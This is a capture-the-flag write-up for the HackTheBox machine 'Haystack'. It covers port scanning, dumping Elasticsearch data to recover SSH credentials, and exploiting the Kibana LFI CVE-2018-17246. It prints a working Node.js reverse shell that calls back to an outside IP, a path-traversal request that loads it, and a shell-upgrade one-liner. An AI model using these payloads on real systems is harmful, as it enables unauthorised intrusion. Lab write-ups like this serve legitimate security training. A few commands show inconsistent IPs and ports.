@@ -1,0 +1,118 @@
+I"n<ul>
+  <li>Box: Haystack
+    <ul>
+      <li>Difficulty: Easy</li>
+      <li>Points: 20</li>
+      <li>Release: 29 Jun 2019</li>
+      <li>IP: 10.10.10.115</li>
+    </ul>
+  </li>
+</ul>
+
+<p>###Initial Enumeration</p>
+
+<p>####1. Nmap Scanning</p>
+
+<p>Starting with a scan of the target ip address:</p>
+
+<p><code class="highlighter-rouge">nmap -sC -sV -oA haystack.nmap 10.10.10.115</code></p>
+
+<p><img src="/images/posts/htb/haystack/haystack1.jpg" /></p>
+
+<p>The port scan shows ports 22, 80, 9200 are open.
+Just from the scan we can identify that port 80 has <strong>text/html</strong> as its context-type whereas port 9200 has <strong>application/json</strong>. This can point towards some kind of API running as API’s usually return with <strong>json</strong>.</p>
+
+<p>Loading up the website we see:</p>
+
+<p><img src="/images/posts/htb/haystack/haystack2.jpg" /></p>
+
+<p>In the meantime, we will run a gobuster scan to find any more directories:</p>
+
+<p>####2. Gobuster Scanning</p>
+
+<p><code class="highlighter-rouge">gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k</code></p>
+
+<p>The scan doesn’t find anything interesting.</p>
+
+<p>Next I move to the image in the webpage. I run some basic steganography tools but nothing comes up. That is until I run <strong>strings</strong> on the image and search for a base64 string.</p>
+
+<p>We spot the line of code that looks like base64 so let’s throw that into a decoder and see the output.
+We get the line <code class="highlighter-rouge">"la aguja en el pajar es "clave"</code> and when we enter that into google translate we get <code class="highlighter-rouge">the needle in the haystack is "key"</code></p>
+
+<p>Next we’ll move over to port 9200 which is Elasticsearch.
+Visiting the webpage we can see the source code tells us the version is <strong>6.4.2</strong>.</p>
+
+<p>After a quick search of exploits for this version we see the following tool used to dump the elasticsearch database.</p>
+
+<p>https://github.com/taskrabbit/elasticsearch-dump</p>
+
+<p>We candump indices by using the below command:</p>
+
+<p><code class="highlighter-rouge">curl http://10.10.10.115:9200/_cat/indices?v -s</code></p>
+
+<p>We can see 2 indices named <strong>quotes</strong> and <strong>bank</strong> so let’s use the elasticdump tool and investigate further.</p>
+
+<p>Based on the below output we generate a dump and we can analyze it by running the <strong>cat</strong> command and using <strong>grep</strong> to find particular keywords.</p>
+
+<p>I start with the word <strong>haystack</strong> and we get the output “There’s a needle in this haystack, you have to serach for it” which leads us to believe this is the correct step and to investigate deeper.</p>
+
+<p>The last words of the quotes is a base64 string. Again, let’s decode it and see the output:
+They look to be credentials:</p>
+
+<p><code class="highlighter-rouge">User: security</code>
+<code class="highlighter-rouge">Pass: spanish.is.key</code></p>
+
+<p>We can use these credentials to SSH in and get the user flag which is located at <strong>/home/security/user.txt</strong></p>
+
+<p>###Privilege Escalation</p>
+
+<p>Now that we know we are working on an <strong>ELK</strong> stack we can look at the running processes to see <strong>kibana</strong> and <strong>logstash</strong> are running.</p>
+
+<p>Since kibana is run internally, we can port forward it with the below command:</p>
+
+<p><code class="highlighter-rouge">ssh security@10.10.10.115 -L 5601:127.0.0.1:5601</code></p>
+
+<p>We load up the browser and see the Kibana version is <strong>6.4.2</strong>. A quick google search comes up with the following LFI exploit:</p>
+
+<p>We can that it’s running kibana 6.4.2 . A quick google search gets us to CVE-2018–17246.
+<a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a></p>
+
+<p>We can simply make a reverse shell using this JavaScript shell from: https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/</p>
+
+<p>I’m going to go ahead and save that in the tmp folder on the kibana server.</p>
+
+<p><code class="highlighter-rouge">
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4444, "10.10.14.31", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+</code></p>
+
+<p>We then want to navigate to the below in the browser. We should see the listener get a connection back as the user <strong>kibana</strong></p>
+
+<p><code class="highlighter-rouge">http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../tmp/shell</code></p>
+
+<p>Then you can run <code class="highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")'</code> to upgrade to a Python shell.</p>
+
+<p>After running LinEnum.sh we see <strong>logstash</strong> mentioned a few times. Since this box deals with ELK stack we can take a look into <strong>Logstash</strong> to see if there is anything of interest.</p>
+
+<p>In <strong>/etc/logstash</strong>, we find a directory called <strong>conf.d</strong> which holds some key Logstash config files.</p>
+
+<p>The three config files do the following:</p>
+
+<p>I read into Logstash and how it uses these three configuration files.</p>
+
+<ul>
+  <li>input.conf determines the conditions of the input file that Logstash will act on.</li>
+  <li>filter.conf defines a regex that matches the contents of the input file.</li>
+  <li>output.conf determines what actions will be taken on the input file</li>
+</ul>
+:ET
